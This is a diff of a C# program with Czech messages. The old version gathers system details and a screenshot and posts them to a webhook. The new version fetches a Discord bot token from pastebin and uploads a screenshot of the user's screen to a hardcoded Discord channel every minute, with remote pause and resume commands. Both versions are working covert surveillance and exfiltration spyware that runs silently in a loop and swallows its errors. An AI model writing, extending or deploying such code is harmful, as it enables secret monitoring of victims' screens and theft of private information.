@@ -1,87 +1,100 @@
 using System;
-using System.Net.Http;
-using System.Text;
-using System.Management;
-using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
-using System.IO;
+using System.Net.Http;
 using System.Threading;
+using System.IO;
+using System.Text;
 
 public class Program
 {
-    public static void Main(string[] args)
-    {
-        string webhook = args[0];
+    private static bool isPaused = false;
+    private static string token = ""; 
+    private static string channelId = "1492648143974568066";
+    private static readonly HttpClient client = new HttpClient();
 
-        // Nekonečná smyčka pro periodické odesílání
+    public static void Main(string dummy)
+    {
+        try 
+        {
+            token = client.GetStringAsync("https://pastebin.com/raw/GkZBCURh").Result.Trim();
+            client.DefaultRequestHeaders.Add("Authorization", "Bot " + token);
+            
+            SendMessage("🟢 **PC zapnut!** Bot se úspěšně spustil a token byl načten.").Wait();
+        }
+        catch (Exception e)
+        {
+            return; 
+        }
+
         while (true)
         {
-            try 
-            {
-                RunTask(webhook);
-            } 
-            catch { }
+            CheckDiscord().Wait();
 
-            // Čekání 10 minut (600 000 ms)
-            Thread.Sleep(60000); 
+            if (!isPaused)
+            {
+                SendScreenshot();
+            }
+
+            Thread.Sleep(60000); // 1 minuta
         }
     }
 
-    public static void RunTask(string webhook)
+    private static async System.Threading.Tasks.Task SendMessage(string message)
     {
-        var client = new HttpClient();
-
-        // 1. Sběr systémových informací
-        string ip = "N/A";
-        try { ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim(); } catch {}
-        
-        string pcName = Environment.MachineName;
-        string cpu = "";
-        using (var s = new ManagementObjectSearcher("select Name from Win32_Processor"))
-            foreach (var obj in s.Get()) cpu = obj["Name"].ToString();
-
-        var gpus = new List<string>();
-        using (var s = new ManagementObjectSearcher("select Name from Win32_VideoController"))
-            foreach (var obj in s.Get()) gpus.Add(obj["Name"].ToString());
-        string gpuList = string.Join(", ", gpus);
-
-        long mem = 0;
-        using (var s = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory"))
-            foreach (var obj in s.Get()) mem += Convert.ToInt64(obj["Capacity"]);
-        int ram = (int)(mem / 1024 / 1024 / 1024);
-
-        var drive = new System.IO.DriveInfo("C");
-        long disk = drive.AvailableFreeSpace / 1024 / 1024 / 1024;
-
-        string time = DateTime.Now.ToString("HH:mm:ss");
-        string report = "**REPORT: " + pcName + " (" + time + ")**\n---\n**IP:** " + ip + "\n**CPU:** " + cpu + "\n**GPU:** " + gpuList + "\n**RAM:** " + ram + "GB\n**Disk C:** " + disk + "GB volných";
-
-        // 2. Pořízení screenshotu do RAM
-        Rectangle bounds = Screen.PrimaryScreen.Bounds;
-        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+        try
         {
-            using (Graphics g = Graphics.FromImage(bitmap))
+            var content = new StringContent("{\"content\":\"" + message + "\"}", Encoding.UTF8, "application/json");
+            await client.PostAsync($"https://discord.com/api/v10/channels/{channelId}/messages", content);
+        }
+        catch { }
+    }
+
+    private static async System.Threading.Tasks.Task CheckDiscord()
+    {
+        try
+        {
+            var response = await client.GetStringAsync($"https://discord.com/api/v10/channels/{channelId}/messages?limit=1");
+            
+            if (response.Contains("\".close\"") && !isPaused)
             {
-                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                isPaused = true;
+                await SendMessage("🛑 **Monitoring pozastaven.** (.back pro obnovení)");
+            }
+            if (response.Contains("\".back\"") && isPaused)
+            {
+                isPaused = false;
+                await SendMessage("▶️ **Monitoring obnoven.**");
+            }
+        }
+        catch { }
+    }
+
+    private static void SendScreenshot()
+    {
+        try
+        {
+            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            using (Graphics g = Graphics.FromImage(bmp))
+            {
+                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
             }
 
-            using (MemoryStream ms = new MemoryStream())
+            using (var ms = new MemoryStream())
             {
-                bitmap.Save(ms, ImageFormat.Png);
+                bmp.Save(ms, ImageFormat.Png);
                 byte[] byteImage = ms.ToArray();
 
-                using (var form = new MultipartFormDataContent())
-                {
-                    form.Add(new StringContent(report, Encoding.UTF8), "content");
-                    var imageContent = new ByteArrayContent(byteImage);
-                    imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
-                    form.Add(imageContent, "file", "screenshot.png");
-
-                    client.PostAsync(webhook, form).GetAwaiter().GetResult();
-                }
+                MultipartFormDataContent content = new MultipartFormDataContent();
+                content.Add(new ByteArrayContent(byteImage), "file", "screen.png");
+                
+                var response = client.PostAsync($"https://discord.com/api/v10/channels/{channelId}/messages", content).Result;
             }
+        }
+        catch (Exception e)
+        {
+            SendMessage("❌ **Chyba:** " + e.Message).Wait();
         }
     }
 }
